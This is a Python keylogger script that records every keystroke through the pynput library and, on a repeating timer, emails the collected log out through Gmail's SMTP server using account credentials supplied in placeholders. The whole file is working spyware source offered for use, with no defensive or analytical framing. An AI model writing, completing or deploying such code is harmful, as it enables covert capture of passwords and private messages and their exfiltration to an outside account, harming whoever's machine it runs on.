import pynput.keyboard,threading,smtplib
#Use only gmail

class Keylogger:
    def __init__(self,email,password,interval): #(constructor method __init__)This will start when the object is created with this class
        self.log = "\n\n keylogger started"
        self.email = email
        self.password = password
        self.interval = interval
        print("It's running wtf")

    def send_mail(self,text):
        server = smtplib.SMTP("smtp.gmail.com",587)
        server.starttls() #start a tls connection
        server.login(self.email,self.password)
        server.sendmail(self.email,self.email,text)
        server.quit()

    def append_log(self,string):
        self.log = self.log + string

    def key_processor(self,key):
        try:
            current_key = str(key.char)  
        except AttributeError:
            if key == key.space :
                current_key = " "
            else:
                current_key = " " + str(key) + " "
        self.append_log(current_key)

    def print_keys(self):
        self.send_mail("\n\n"+self.log)
        self.log=""
        timer = threading.Timer(self.interval,self.print_keys)
        timer.start()    
        
    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press=self.key_processor)
        with keyboard_listener:
            self.print_keys()
            keyboard_listener.join()
            
script = Keylogger("<your email>","<your password>",<time interval(int)>)
script.start()         
    

    
